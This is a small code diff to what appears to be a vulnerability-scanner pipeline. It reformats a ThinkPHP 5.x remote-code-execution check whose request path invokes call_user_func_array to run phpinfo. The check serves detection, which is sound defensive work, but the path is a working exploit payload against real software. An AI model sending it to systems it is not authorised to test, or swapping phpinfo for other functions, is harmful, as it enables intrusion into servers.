@@ -581,7 +581,10 @@ class VulnerabilityPipeline:
             "ThinkPHP": [
                 {
                     "check": "rce_5x",
-                    "path": "/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
+                    "path": (
+                        "/?s=/index/\\think\\app/invokefunction"
+                        "&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+                    ),
                     "method": "GET",
                 },
             ],
